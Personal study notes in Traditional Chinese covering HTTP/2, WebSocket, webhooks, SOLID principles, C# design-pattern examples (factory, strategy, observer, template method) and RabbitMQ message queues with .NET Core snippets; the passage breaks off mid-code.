  - ###### SSL 也會數位簽署資料，以便提供**資料整合性**，驗證資料在抵達預定的收件者之前沒有遭到竄改。

- ##### SSL 憑證包含下列資訊：

  - ###### 憑證擁有者的名稱

  - ###### 憑證的序號及到期日期

  - ###### 憑證擁有者公開金鑰的副本

  - ###### 憑證簽發有關單位的電子簽名

### HTTP/2

- ##### **主要目的是透過一些措施改善瀏覽器瀏覽網頁加載的速度(page load)**

- ##### http/2與 http/1.1有著高度的相容信，舉凡request method, http status code, url, header 等等，因此只需要確保你的網站有支援https(因為瀏覽器只支援https 在http/2上)

- ##### 與HTTP差異

  - ###### HTTP/2 協定建置在 HTTPS 安全連線之上，因此在更新 HTTP/2之前，網站必須要擁有 TLS/SSL 安全性憑證來保障安全連線。

  - ###### 在減少多個連線工作次數的情況下，瀏覽器只需單一網路連線就可以與網站伺服器進行連接。

  - ###### 由單一網路連線時達成同時傳輸多個 HTTP Request 和 Response，並擴充增加可以同時請求發送 CSS/JS/Images 等等資源。

  - ###### 優先權設計(Prioritization)，伺服器可以決定例如 CSS 或 JavaScript 檔案，哪些要優先傳送。

  - ###### Header 壓縮，HTTP/2 處理了絕大部份重複的 Headers ，並在傳送前進型壓縮，有效減少了過多重複的資訊也縮短了冗長得傳輸過程。

  - ###### HTTP/2 使用單一Binary 二進位的封包結構設計，對伺服器和瀏覽器來說，可以更快的解析傳輸資料。

  - ###### 伺服器主動推送資源(Server Push)，允許伺服器除了 HTML 之外，連同需要的 CSS/JavaScript/Images 檔案，主動推到瀏覽器的快取之中。

#### Request and response multiplexing (多路複用)

- ###### 在http/1.1中，client端時常會同時發起多個request至server拿取檔案(像是js, css, image等)，以此方式達到快速載入頁面。如下圖在http/1.1中會同時與server建立3個TCP connection，但是瀏覽器通常會限制TCP connection同時建立的數目。因此在http/2協定中，允許client端與同一server建立單一TCP connection並以非同步方式傳輸要的檔案。

- ![img](https://miro.medium.com/max/1050/1*xRIvJ0b_aDgcud2j2Je8JQ.png)

#### Header compression (標頭壓縮)

- ##### 每一個http的傳輸中都會攜帶一組header，在http/1.1中，header會是以明文(plain text)傳輸大小通常會是500-800 bytes，若有攜帶cookie也有可能會更大。因此在http/2中，會將request以及response的header使用HPACK演算法壓縮header的內容，此方法壓縮後可以減少85%-88%的大小

#### Server push (伺服器推送)

- ##### 在http/1.1中，通常client端request甚麼server就會回傳甚麼，例如: 當client request html那麼server將只會回傳html。但在http/2中，允許server主動推送有相關的資料給client，例如: 當client只request html，但是server知道client request此html後續也會request css, js等，因此server就會在client沒有request的情況下主動推送css, js檔給client。那server怎麼知道這些檔案是有相關性的呢? web developer將需要server push的檔案加上特定的描述即可

- ![img](https://miro.medium.com/max/900/1*FSELCfdKHCdoqr5Ejd5MYQ.png)

#### Binary framing layer

- ##### 在http/2中，header與body所挾帶的property與http/1.1相同(ex. verbs, methods)，然而兩者在傳輸上會有不同。在http/2中，會將header以及body編碼成二進制在server 與client端中傳輸，在http/1.1中，則是以明文的方式傳輸。將訊息編碼成二進制進行傳輸，此特性是http/2 的其他特性的根本基礎。

- ![img](https://miro.medium.com/max/1050/1*rFE7nzYYZuUsLss7j6Xguw.png)

### WebSocket 

- ##### `WebSocket` 協定只需透過一次連結便能保持連線，不必再透過一直發送 `Request` 來與 Server 互動

- ##### WebSocket是瀏覽器與伺服器交換資料的方式之一，與HTTP最大的不同是，他是一個持續的雙向的連線，所以沒有重新連線，重新傳送檔頭等多餘的負荷，反應更即時。

- ##### Wiki：「WebSocket是一種網路傳輸協定，可在單個TCP連接上進行全雙工通訊，位於OSI模型的應用層。」

- ![img](http://www.ruanyifeng.com/blogimg/asset/2017/bg2017051502.png)

- ##### WebSocket可以選擇ws或是wss通訊協定，ws就相當於一般的http，wss則相當於https，不過需要伺服器可以支援。

- ##### 由於時持續的連線，所以在連線中URI是不會改的，所以每次也只能選擇一個URI，想跟不同URI連線，就需要建立新的WebSocket連線。

  

# Webhook

- ##### 簡單來說就是一種反向API機制，類似於觸發器的一樣。

- ##### 說到底就是一種「事件驅動」的設計，而什麼是「事件驅動」呢？

  - ##### 舉例： 「當(發生什麼事件)時(請主動通知我)」，那被通知的那一方要做什麼事情就跟主動通知方無關了，藉由這樣的設計減少核心系統的複雜程度。

  - ![img](https://s3-ap-northeast-1.amazonaws.com/upload.potatomedia.co/articles/potato_609ab82b-3b04-4776-bb15-36f0ab291d19_8b2f84b9c537127301deb4ff72ecf61c62c63278.png)

  - ![img](https://s3-ap-northeast-1.amazonaws.com/upload.potatomedia.co/articles/potato_609ab82b-3b04-4776-bb15-36f0ab291d19_46387e0c560da578ecf33e6514e286af629ff331.png)

- ##### 消費一個webhook是爲webhook準備一個URL，用於webhook發送請求。

- ##### 多數webhook以兩種數據格式發布數據：JSON或者XML，這需要解釋。另一種數據格式是application/x-www-form-urlencoded or multipart/form-data。




# 設計模式

## SOLID

- ###### 單一職責原則(Single responsibility principle, SRP)

  - ###### 把工作交給負責該職責的類別去做，自己只需要關注在自己正在處理的職責即可。

  - ###### 例如訂單管理，會涉及到訂單處理及會員資料

    - ###### 若全部寫在同一個類別，當訂單處理的商業邏輯、查詢會員資料的邏輯或是通知會員的方式有變更的時候，這個函式都會受到影響，也就是說這個函式同時對多個不同對象負責。這樣的類別或函式就是不穩定的。

    - ###### 解決方法: 會員的處理一律封裝回會員管理類別，我們再藉由會員管理類別去調用其方法取回資料；寄送信件也封裝到通知管理類別，不用去管用什麼方法通知的，我們只需要去要求其通知即可。

  - ###### 當我們並未遵守單一職責原則時，同個類別裡面充斥著不同工作的處理邏輯。也就是不健康的內聚：完全不夠聚，就只是盤散沙。

    - 容易產生重複的邏輯處理，增加維護困難
    - 同時我們在修改時也無法界定邊界，無法確定這次修改影響到的範圍，我們並不知道這些放在一起的東西，或是同一段做的所有事之間是否會相互影響
    - 為了要確保修改沒有問題，我們必須大量閱讀不相關的程式碼，無形中造成開發負擔，降低開發效率。

- ###### 開放封閉原則(Open-Close principle, OCP)

  - ###### 對擴展開放，而對修改封閉

  - ###### 面對需求，對程式碼的改動是透過增加新程式碼進行的，而不是更改現有的程式碼

  - ###### 用擴充的方式去完成變化，而不是用針對內部進行修改的方式來做；希望藉由良好的設計，能迴避上面那串修改困難導致成本高昂的問題。

  - ###### 當需求有異動時，藉由**繼承**、**相依性注入**等方式，增加新的程式碼，以實作新的需求。

- ##### 里氏替換原則(Liskov substitution principle, LSP)

  - ###### 當實作繼承了 interface 或 base-class的 sub-class，那麼在程式中，只要出現該 interface 或 base-class 的部份，都可以用 sub-class 替換。

    - ###### 子類別替換父類別後，不需要改變，也不會發生任何錯誤或異常。父類別能做到的事情，子類別也要能做到

  - 簡單說明，繼承後的子類別應該要能達到父類別原先的功能以符合呼叫該涵式人的期望

    - ###### 我們預期了這個函式或類別需要準備的輸入參數，也預期了應該要有的輸出結果。如果某一天替換了子類別，卻不是這麼一回事，就會發生很多意料外的錯誤。

- ##### 介面隔離原則(Interface segregation principle, ISP)

  - ###### 針對不同需求的用戶，開放其對應需求的介面，提拱使用。可避免不相關的需求介面異動，造成被強迫一同面對異動的情況。

  - ###### 當介面規定了太多要求，而我們實作的子類別只需要其中一部份，或是有些要求根本無法達成，就會發生這個困境：放棄實作介面，或是用空實作和錯誤處理去欺騙介面。

  - ###### 最小化類別與類別之間的介面

- #####  依賴反轉原則(Dependency inversion principle, DIP)

  - 高階模組不應該依賴於低階模組。

    - ###### 兩者都應該依賴抽象，不應該直接去依賴，而是必須藉由抽象來隔開。不應該直接去受到實作的影響，而是只要關注在所需要的功能。

    - ###### 如此一來，依賴就「反轉」了。原本是 `高階模組 → 低階模組` 的關係，變成了 `高階模組 → 介面 ← 低階模組`。並不是高階去依賴低階，而是低階去依賴高階要求的功能。

  - ###### 抽象不應該依賴細節；細節應該依賴抽象。

  - 

## 簡單工廠模式(Simple Factory Pattern)

### 定義

- 透過建立一個類別來負責創建實體，這些實體都繼承於同一個父類別
- Product: 抽象的父類別(披薩)
- Factory: 負責建立實體邏輯的類別
- ConcreteProduct: 實體本身(海鮮、夏威夷)

### 實例

- 假設我們是一間我們是一間披薩店提供各種口味的披薩。

- 披薩製作的程序包含AddMaterial(加料)、Bake(烘烤)，當客人要一個海鮮披薩時如下

  ```cs
  public SeaPizza MakePizza()
  {
      SeaPizza pizza= new SeaPizza();
      pizza.AddMaterial(); 
      pizza.Bake(); 
      return pizza;
  }
  ```

   

- 當今天可人要改點夏威夷披薩時

  ```cs
  public HawaiiPizza MakePizza()
  {
      HawaiiPizza pizza= new SeaPizza();
      pizza.AddMaterial(); 
      pizza.Bake(); 
      return pizza;
  }
  ```

   

- 我們可以發現，當今天我們研發出新的口味時我們就必須建立新的類別。可是每個類別執行的動作其實都是一樣的(AddMaterial、Bake)，這時候我們可以將這些行為封裝起來成為一個抽象的Product

  ```cs
  public interface IPizza
  {
      void AddMaterial();
      void Bake();
  }
  ```

   

- 接著，我們可以讓每種口味的披薩繼承IPizza介面並根據每個披薩的種類時做內容

  ```cs
  public class SeaPizza: IPizza
  {
    public void AddMaterial()
    {
     Console.WriteLine("加入海鮮佐料");
    }
  
    public void Bake()
    {
     Console.WriteLine("烘烤海鮮披薩");
    }
  }
  
  public class HawaiiPizza : IPizza
  {
    public void AddMaterial()
    {
     Console.WriteLine("加入火腿片、鳳梨");
    }
  
    public void Bake()
    {
     Console.WriteLine("烘烤夏威夷披薩");
    }
  }
  ```

   

- 最後我們建立一個SimpleFactory來決定何時該生產哪種口味的披薩。

  ```cs
  public class SimpleFactory
  {
      public IPizza CreatePizza(string name)
      {
          if (name== "Sea")
              return new SeaPizza();
  
          if (name== "Hawaii")
              return new HawaiiPizza();
  
          else
              return null;
      }
  }
  ```

   

- 另外，我們可以將整個披薩的製成包裝在一個類別裡

  ```cs
  public class PizzaStore
  {
      private SimpleFactory  _factory;
  
      public PizzaStore(SimpleFactory  pFactory)
      {
          _factory = pFactory;
      }
  
      public IPizza CreateProduct(string name)
      {
          IPizza pizza = _factory.CreatePizza(name);
  
          pizza .AddMaterial();
          pizza .Bake();
  
          return pizza ;
      }
  }
  ```

   

- 終於，我們可以依造客人的需求提供不同的Pizza了

  ```cs
  static void Main(string[] args)
  {
      PizzaStore store = new PizzaStore(new SimpleFactory());
  
      store.CreateProduct("Sea");
  
      store.CreateProduct("Hawaii");
  }
  ```

## 工廠方法模式(Factory Method Pattern)

- ##### 簡單工廠的延伸，不再提供統一的工廠類來建立所有物件，而是將Factory類別抽象化，針對**不同分類的物件有不同的工廠**。

- **優點：** 

  - ###### 將創建物件的邏輯與物件本身的邏輯分離。一個工廠只會對應一個類別，完全遵守了[開放封閉原則](https://ithelp.ithome.com.tw/articles/10233481)。

### 結構

- 抽象工廠角色(IFactory)：定義抽象的方法或介面，讓繼承的實體工廠進行實作
- 具體工廠角色：實作抽象工廠
- 抽象產品角色(IPizza)：定義產品抽象方法或介面
- 具體產品角色：實作抽象產品的方法或介面

### 建立抽象工廠

- 從上次簡單工廠的例子中我們可以看出，當我們需要增加新的口味時，工廠類別的判斷式就會不段增加。

  ```cs
  public class SimpleFactory
  {
      public IPizza CreatePizza(string name)
      {
          if (name== "Sea")
              return new SeaPizza();
  
          if (name== "Hawaii")
              return new HawaiiPizza();
  
          if (name== "Pork")
              return new PorkPizza();
  
          if ...
  
          else
              return null;
      }
  }
  ```

- 這樣的結果造成了工廠類別的複雜度，也導致我們的維護成本提升

- 因此，我們在一次抽象畫工廠類別

  ```cs
  public interface IFactory
  {
    Ipizza  CreatePizza();
  }
  ```

- 接著，我們只須要讓每種口味的披薩自己去時做各自工廠的邏輯

  ```cs
  class PorkPizzaFactory : IFactory
  {
      public Ipizza CreatePizza()
      {
          return new PorkPizza();        
      }
  }
  
  class SeaPizzaFactory : IFactory
  {
      public Ipizza CreatePizza()
      {
          return new SeaPizza(); 
      }
  }
  ```

- 當我們需要新的口味時，只要建立一個新的具體工廠腳色。這樣一來我們在維護上也變得更加輕鬆，程式的相依性也相對降低。

- 最後，我們在來改寫上次的PizzaStore

  ```cs
  public class PizzaStore
  {
      private IFactory _factory;
  
      public PizzaStore(IFactory pFactory)
      {
          _factory = pFactory;
      }
  
      public IPizza CreateOrder()
      {
          IPizza pizza = _factory.CreatePizza();
  
          pizza .AddMaterial();
          pizza .Bake();
  
          return pizza ;
      }
  }
  ```

  ```cs
  static void Main(string[] args)
  {
      PizzaStore seaStore = new PizzaStore(new seaPizzaFactory ());
      seaStore.CreateOrder();
  
      PizzaStore porkStore = new PizzaStore(new PorkPizzaFactory ());
      porkStore.CreateOrder();
  }
  ```



## 策略模式(Strategy Pattern)

- #### 定義`一系列的演算法`，並且把這些算法，`用介面封裝到有公共介面的策略類中`，使他們可以互相替換。

- ##### 策略模式主要是在封裝執行相同行為的類別，這些類別是針對相同的任務但本身的邏輯/內容可能不相同。

- ##### 將這些行為封裝起來便於抽換，以保持彼此間的獨立。

### 情境:

- ##### 假設我們今天要開發一款RPG遊戲，裡面包含戰士、盜賊、弓箭手。

- ##### 每個角色都包含攻擊及防禦兩個行為，這時候建立一個腳色的類別好像是不錯的主意。這樣每個腳色都能繼承類別中的行為。

  ```cs
  public abstract class Role
  {
      public override void Attack()
      {
          Console.WriteLine("進行攻擊");
      }
  
      public void Defence()
      {
          Console.WriteLine("進行防禦");
      }
  }
  
  public class Warrior: Role
  {
  }
  
  public class Assassin : Role
  {
  }
  ```

- ##### 今天我們新開了一個法師的腳色，而且法師的攻擊與戰士的攻擊甚至是盜賊、弓箭手之間的模式應該都是不一樣的，這時候，你可能會想用繼承類別行為的發法來改寫每一個腳色的動作

  ```cs
  public abstract class Role
  {
      public void Attack()
      {
      }
  
      public void Defence()
      {
      }
  
      public void Support()
      {
      }
  }
  
  public class Warrior: Role
  {
  
      public override void Attack()
      {
          Console.WriteLine("進行強力攻擊");
      }
  
      public void Defence()
      {
          Console.WriteLine("進行盾牌防禦");
      }
  }
  
  public class Assassin : Role
  {
  
      public void Attack()
      {
          Console.WriteLine("進行背刺");
      }
  
      public void Defence()
      {
          Console.WriteLine("進行潛行");
      }
  }
  
  public class Magician : Role
  {
  
      public void Attack()
      {
          Console.WriteLine("魔法攻擊");
      }
  
      public void Defence()
      {
          Console.WriteLine("展開分身");
      }
  }
  ```

- ##### 這當然是一種方法，可是當我們又增加 一個行為時又必須調整每一個腳色。

### 定義

- 將變動部分封裝起來
- 針對介面寫程式，不是針對實踐寫程式。
- 多用合成，少用繼承。

### 調整

- 將攻擊、防禦等行為封裝成介面

  ```cs
  public interface AttackBehavior{
      public void Exec();
  }
  
  public interface DefenseBehavior{
      public void Exec();
  }
  ```

- 每一種動作繼承改寫對應的行為

  ```cs
  public WeaponAttack : AttackBehavior
  {
   public void Exec()
   {
    Console.WriteLine("使用弓箭射擊");
   }
  }
  
  public NormalAttack : AttackBehavior
  {
   public void Exec()
   {
    Console.WriteLine("使用重拳攻擊");
   }
  }
  
  public MagicAttack : AttackBehavior
  {
   public void Exec()
   {
    Console.WriteLine("使用魔法攻擊");
   }
  }
  ```

- 最後，我們來調整腳色的類別

  ```cs
  public class Role
  {
      private AttackBehavior _attackBehavior;
      private DefenseBehavior _defenseBehavior ;
      
      public Role(AttackBehavior attackMode, DefenseBehavior defenseMode)
      {
       this._attackBehavior = attackMode;
       this._defenseBehavior = defenseMode;
      }
  
      public override void Attack()
      {
       this._attackBehavior.Exce();
      }
  
      public void Defense()
      {
       this._defenseBehavior .Exce();
      }
  }
  
  static void Main(string[] args)
  {
      Role Worrior = new Role(new NormalAttack(),new NormalDefense());
      Worrior.Attack();
      Worrior.Defense();
  
      Role Magican = new Role(new MagicAttack(),new MagicDefense());
      Magican.Attack();
      Magican.Defense();
  }
  ```

##  觀察者模式 (Observer Pattern)

- ###### 定義物件之間一種一對多的依賴關係，當一個物件狀態發生改變時，所有依賴於他的物件都將自動地得到通知且被更新。

### 前言

- 生活中，我們透過不同的『訂閱』機制，來取得最新資訊。例如，訂閱報紙、部落格、FB粉絲追蹤
- 這種訂閱後就能自動收到更新通知 的概念，即是 觀察者模式。
- 被訂閱、被追蹤、被觀察的，稱為 — 主題/目標 (Subject)
- 而對主題感興趣的則是 — 觀察者 (Observer) ，

### 以訂閱報紙為例

- 首先，我們要定義目標(Subject)類別，要求繼承類別的物件必須實作註冊、移除、發送通知等方法。

- 接著，我們定義一個Observer類別，要求每個繼承類別的物件必須實作update()方法

- ```cs
  public interface ISubject
  {
      void RegisterObserver(IObserver observer);
      void RemoveObserver(IObserver observer);
      void NotifyObservers(string msg);
  }
  
  public interface IObserver
  {
      void Update(string msg);
  }
  ```

   

- 接下來，我們開始實作報社類別並實作註冊、移除、發送通知等方法。

  ```cs
  public class NewspaperOffice : ISubject
  {
      List observerList; // 使用List來存放觀察者名單
  
      public NewspaperOffice()
      {
          observerList= new List();
      }
  
      // 加入觀察者
      public void RegisterObserver(IObserver observer)
      {
          observerList.Add(observer);
      }
  
      // 移除觀察者
      public void RemoveObserver(IObserver observer)
      {
          if (observerList.IndexOf(observer) >= 0)
              observerList.Remove(observer);
      }
  
      // 發送通知給在監聽名單中的觀察者
      public void NotifyObservers(string message)
      {
          foreach (IObserver observer in observerList)
          {
              observer.Update(message);
          }
      }
  
      // 訂閱報紙
      public void SubscribeNewspaper(IObserver customer)
      {
          RegisterObserver(customer);
      }
  
      // 取消訂閱報紙
      public void UnsubscribeNewspaper(IObserver customer)
      {
          RemoveObserver(customer);
      }
  
      // 發送新消息
      public void SendNewspaper(string message)
      {
          Console.WriteLine("Send News..");
          NotifyObservers(message);
      }
  }
  ```

   

- 實作Observer類別

  ```cs
  public class Customer : IObserver
  {
      public string Name { private get; set; }
  
      public Customer(string pName)
      {
          Name= pName;
      }
      
      // 更新最新消息
      public void Update(string message)
      {
          Console.WriteLine("   {0} receive a new message:{1}", Name , message);
      }
  }
  
  static void Main(string[] args)
  {
      // 產生一間報社
      NewspaperOffice office = new Newsp
  
      Customer AA = new Customer("AA");
      Customer BB = new Customer("BB");
  
      office.SubscribeNewspaper(AA);
      office.SubscribeNewspaper(BB);
  
      // 報社發送了第一則新聞
      office.SendNewspaper("News One.......");
  
      office.UnsubscribeNewspaper(AA);
  
      office.SendNewspaper("News Two.......");
  }
  ```

## 樣板方法模式(Template Method Pattern)

- ##### 把重複性的部分封裝至父類別，讓各類別不同的方法由子類別繼承實踐

### 定義

- ##### 將一個演算法的骨架定義在一個方法中，而演算法本身會用到的一些方法，則是定義在次類別中

- ##### 樣板方法讓次類別在不改變演算法架構的情況下，重新定義演算法中的某些步驟

- ##### 樣板方法定義了一個演算法的步驟，並允許次類別為一個或多個步驟，提供其實踐方式

- ##### 樣板就是一個方法；更具體地說，這個方法將演算法定義成一組步驟。其中的任何步驟都可以是抽象方法，而由次類別負責實踐這些抽象方法。這可以確保演算法的結構維持不變，同時由次類別提供部份實踐方式

- ##### 策略模式與樣版方法模式都是用來封裝演算法。策略模式是用合成；樣板方法模式是用繼承

### 實作

- 定義父類別及封裝共用方法

  ```cs
  abstract class DataAccessObject
  
    {
      protected string connectionString;
      protected DataSet dataSet;
   
      public virtual void Connect()
      {
        connectionString =
          "provider=Microsoft.JET.OLEDB.4.0; " +
          "data source=..\\..\\..\\db1.mdb";
      }
   
      public virtual void Disconnect()
      {
        connectionString = "";
      }
   
   
      public abstract void Select();
      public abstract void Process();
  
      public void Run()
      {
        Connect();
        Select();
        Process();
        Disconnect();
      }
    }
  ```

   

- 子類別繼承父類別，並改寫各自的內容

  ```cs
    class Categories : DataAccessObject
    {
      public override void Select()
      {
        string sql = "select CategoryName from Categories";
        OleDbDataAdapter dataAdapter = new OleDbDataAdapter(
          sql, connectionString);
   
        dataSet = new DataSet();
        dataAdapter.Fill(dataSet, "Categories");
      }
   
      public override void Process()
      {
        Console.WriteLine("Categories ---- ");
   
        DataTable dataTable = dataSet.Tables["Categories"];
        foreach (DataRow row in dataTable.Rows)
        {
          Console.WriteLine(row["CategoryName"]);
        }
        Console.WriteLine();
      }
    }
   
  
    class Products : DataAccessObject
    {
      public override void Select()
      {
        string sql = "select ProductName from Products";
        OleDbDataAdapter dataAdapter = new OleDbDataAdapter(
          sql, connectionString);
   
        dataSet = new DataSet();
        dataAdapter.Fill(dataSet, "Products");
      }
   
      public override void Process()
      {
        Console.WriteLine("Products ---- ");
        DataTable dataTable = dataSet.Tables["Products"];
        foreach (DataRow row in dataTable.Rows)
        {
          Console.WriteLine(row["ProductName"]);
        }
        Console.WriteLine();
      }
    }
  ```

   

# 應用

## Message Queue

### Application Intergration

- ###### 一個系統中，一般不會只有一隻程式在運作，而是會有多隻程式同時負責各種不同的任務，而程式之間難免會有互相傳遞資料進行處理的需求，而這類的需求，以下都統稱為 applcation 的整合。

- ##### 常見的 Application Intergration 方式又分為以下幾種：

  - ###### File Based Intergration

    - ###### source application 根據要處理的任務，產生檔案到特定的路徑，其中任務成功或失敗可以存放到不同 folder 中。而其他接收訊息的 application(或稱 process application) 則是不停監控該路徑有沒有新檔案產生，有則取出檔案進行處理。

    - ![img](https://miro.medium.com/max/1400/1*t9FX6FQKmeTjsRt7hx97NA.png)

  - ###### Shared Database Intergration

    - ###### 與File Based差不多，差別在資料儲存於DB

    - ![img](https://miro.medium.com/max/1400/1*IOI9Z8zymQl5RbVB-2rXEw.png)

  - ###### Direct Connection Intergration

    - ###### source application 直接傳訊息給 process application

    - ###### 可能透過 TCP/IP 或是 named pipe connection 的方式傳遞資料

    - ###### 傳遞資訊的資料格式並沒有限制，由連線兩端的 application 自訂，可以是純文字、XML 或 JSON。

    - ![img](https://miro.medium.com/max/1400/1*AQ5aLr5OTR0_tpthiq2EGA.png)

  - ###### Asynchronous Message Broker

    - ##### 特性：

      - ###### 不限傳遞資料格式

      - ###### 需要額外 message queue middleware 協助，也會被稱作 message broker 或 message bus

      - ###### message broker 收到來自 source application 的訊息後，會轉發給 process application，而在這個方式中，source application 與 process application 通常又各自被稱為 producer 與 consumer。

    - ![img](https://miro.medium.com/max/1400/1*62CxFz1kTKLixkDqr9qtAw.png)

### 訊息佇列

- ##### 從字面意思上看，本質是個佇列，FIFO先入先出，只不過佇列中存放的內容是message。

- ##### 其主要用途：

  - ##### 不同程序 Process 之間

  - ##### 不同執行緒 Thread 之間

  - ##### 不同服務之間 (Microservice)

- ##### 架構由 

  - ##### Producers 負責創建訊息並傳遞訊息至 Message Queue

  - ##### Consumers 負責從 queue 中取出訊息並執行對應的行為。存放在 queue 中的 Message 會在被 Consumers 接收後才會移除。

- ##### 優勢

  - ###### Better performance

    - 非同步處理，Producers拋出訊息後不需要等待回應。
    - consumer 有空時才會處理 message
    - 比起持續 polling 的方式相對有效率(輪詢: 接收端定時查看Producers 狀態決定是否進行下一步，如上述File Based Intergration ,Shared Database Intergration)

  - ###### 解耦

    - 將 publisher 與 consumer 進行 decouple ，程式開發人員可以各自專心負責規模較小 & 單純的程式開發工作
    - publisher 與 consumer 不需要知道雙方的實際的位置(例如：IP address)，只要將資料往 message queue 送就好
    - Break up apps & migrate to microservice

  - ###### Reliablity

    - queue 使 data 不易丟失
    - 即使 consumer 短暫的無法提供服務也沒關係，message queue 可以將資料暫存起來，等待 consumer 重新上線時再送過去

  - ###### Flexiability of scaling

    - producer, queue, consumer 可以依照需求擴張或縮減

- ##### Eaxmple

  - 假設你擁有一個 web service，每秒需要接受大量 request，request 不能被丟失，但 request 又要經過一個大量運算的 function 才能得到 response….
    - ![img](https://miro.medium.com/max/1400/1*ygPEYxQY-PQiaMPQ8cQ5lA.png)

### RabbitMQ 

- ![img](https://miro.medium.com/max/1400/1*PAJJlbfy78PrFSnwYjCnlw.png)

- ##### 元件屬性:

  - ###### Producer

    - 負責丟訊息到 Queue 中，若有定義 Exchange，則丟給 Exchange 決定要給誰。

  - ###### Consumer

    - 負責接收來自 Queue 的訊息。

  - ###### Queue

    - 負責存放所需要的資料，跟資料結構的 Queue 一樣，有先進先出 (FIFO) 特性，每個 Queue 都會有他的名字當 id。

  - ###### Channel

    - Channel是建立在Connection上的一個虛擬通訊管道。一般情況下，往訊息佇列中寫入多條訊息，為了不每條訊息都建立一個TCP連線，所以RabbitMQ的做法是多條訊息可以公用一個Connection，大大提高MQ的負載能力。

  - ###### Exchange

    - ![RabbitMQ Exchange](https://godleon.github.io/blog/images/middleware/message-queue_concept-binding.png)
    - Exchange 是 RabbitMQ 系統中負責轉發訊息的元件， Producer 無法將訊息直接傳到 Queue 中，在 RabbitMQ 中訊息的第一個進入點是 Exchange
    - 實際儲存訊息的 Queue 會根據使用者的設定，與不同的 Exchange 進行綁定
    - 當 Exchange 收到訊息後，就會轉發到與其綁定的 Queue (可能 0 到多個不等)
    - Exchange 僅能將訊息轉發到與其綁定的 Queue 上
    - 至少會有一個預設 Exchange 存在於 RabbitMQ 系統中，稱為 **default exchange**，轉發的模式為 `direct`；每個新建立的 Queue，若是沒指定 exchane 資訊，就會與預設的綁定
    - Exchange 有四種轉發模式
      - Direct: 直接丟給指定的 Queue。
      - Topic: 類似 regular expression，設定 binding 規則，丟給符合的 Queue。
      - Headers: 透過傳送資料的 header 來特別指定所要的 Queue。
      - Fanout: 一次丟給全部負責的 Queue。

- ##### 官網使用情境說明

  - ###### Task Queue

    - ![img](https://miro.medium.com/max/1196/1*B3q0g4uPCTMY5H0kWlvGLg.png)
    - 不透過 Exchange 直接送到指定的 Queue

  - ###### Publish/Subscribe

    - 透過 Exchange 的 fanout 特性，達到訂閱 Queue 的 Consumer 都可以收到訊息。
    - ![img](https://miro.medium.com/max/1128/1*YNKahFDsg2sbaIG-k31SKQ.png)

  - ###### Routing

    - 透過 Exchange 的 direct 特性，達到類似 routing 的功能，將訊息 filter 到特定的 Queue。
    - ![img](https://miro.medium.com/max/1400/1*6lw6dx5h-p4ZBDC5SJGsdg.png)

  - ###### Topics

    - 透過 Exchange 的 topic 特性，每個 Queue 都有屬於自己的分類。
    - ![img](https://miro.medium.com/max/1400/1*_5vbFy2NODg-atHLiC7fRg.png)

  - ###### RPC

    - 如果需要回傳訊息的話則需要透過 RPC

  - ![img](https://miro.medium.com/max/1400/1*rFE7XPQ7_iCkK7LkjCLEvA.png)

- ##### Message 屬性

  - ![img](https://miro.medium.com/max/1400/1*cWUB5yWOeIykQyWcex8ijg.png)

- ##### Queue 屬性

  - ![img](https://miro.medium.com/max/1400/1*-TqB4L1eBEaGdl4VpLz3VA.png)

- ##### Exchange 屬性

  - ![img](https://miro.medium.com/max/1400/1*3_cbKqwgXrPrlUf3CMl06A.png)

#### 如何防止訊息丟失

- ##### **生產者丟失訊息**

  - ###### 開啟confirm模式。在生產者哪裡設定開啟了confirm模式之後，每次寫的訊息都會分配一個唯一的id，然後如何寫入了rabbitmq之中，rabbitmq會給你回傳一個ack訊息，告訴你這個訊息傳送OK了；

    - ###### 如果rabbitmq沒能處理這個訊息，會回撥你一個nack介面，告訴你這個訊息失敗了，你可以進行重試。而且你可以結合這個機制知道自己在記憶體裡維護每個訊息的id，如果超過一定時間還沒接收到這個訊息的回撥，那麼你可以進行重發。

    - ```C#
       //開啟confirm
          channel.confirm();
          //傳送成功回撥
          public void ack(String messageId){
            
          }
        
          // 傳送失敗回撥
          public void nack(String messageId){
              //重發該訊息
          }
      ```

    - ###### 一條訊息從生產者傳送到RabbitMQ，首先會傳送到Exchange，對應回撥函式confirm()。第二步從Exchange路由分配到Queue中，對應回撥函式則是returnedMessage()。

    - ![在這裡插入圖片描述](https://i.iter01.com/images/3d2ef089a55d0514f1df535615e0ef3ee2f54bb81790154fc6e6d05ed518ab97.png)

    - 

- ##### rabbitmq自己弄丟了資料

  - ###### 建立queue的時候將其設定為持久化的，這樣就可以保證rabbitmq持久化queue的後設資料，但是不會持久化queue裡面的資料。

  - ###### 傳送訊息的時候將訊息的deliveryMode設定為2，這樣訊息就會被設為持久化方式，此時rabbitmq就會將訊息持久化到磁碟上。 必須要同時開啟這兩個才可以。

  - ###### 而且持久化可以跟生產的confirm機制配合起來，只有訊息持久化到了磁碟之後，才會通知生產者ack，這樣就算是在持久化之前rabbitmq掛了，資料丟了，生產者收不到ack回撥也會進行訊息重發。

- ##### 消費者弄丟了資料

  - ###### 消費者從佇列中獲取到訊息後，會直接確認簽收，假設消費者當機或者程式出現異常，資料沒有正常消費，這種情況就會出現資料丟失。所以關鍵在於把自動簽收改成手動簽收，正常消費則返回確認簽收，如果出現異常，則返回拒絕簽收重回佇列。

  - ###### 使用rabbitmq提供的ack機制，首先關閉rabbitmq的自動ack，然後每次在確保處理完這個訊息之後，在程式碼裡手動呼叫ack。這樣就可以避免訊息還沒有處理完就ack

- ![在這裡插入圖片描述](https://i.iter01.com/images/2220f787e989be7a83cb9ed41cc223b6b8b4a8a0bcaec5fb41a22c9a5eb36469.png)

#### Net Core Example

- ##### 安裝MQ

  - ###### 安裝Rabbit時需要同時安裝erlang語言執行環境、RabbitMQ

  - ###### 可以直接透過`Chocolatey` 同步安裝 erlang、MQ

    - `choco install rabbitmq`

- ##### Net Core

  - ###### 安裝套件 `RabbitMQ.Client`

  - ###### 建立Producer

    - ```C#
      const string QUEUENAME = "Tesrt2";
                  //建立連線物件工廠
                  var factory = new ConnectionFactory()
                  {
                      UserName = "admin",
                      Password = "admin",
                      HostName = "localhost",
                      Port = 5672,  //RabbitMQ預設的埠
                  };
      
                  while (true)
                  {
                      using var conn = factory.CreateConnection();
                      var chanel = conn.CreateModel();
      
                      chanel.QueueDeclare(QUEUENAME, true, false, false);
                      chanel.BasicPublish("", QUEUENAME, null, Encoding.Default.GetBytes("hello rabbitmq:"));
                  }
      ```

  - ###### 建立Consumer

    - ```C#
      const string QUEUENAME = "Tesrt2";
      var factory = new ConnectionFactory()
      {
          UserName = "admin",
          Password = "admin",
          HostName = "localhost",
          Port = 5672,
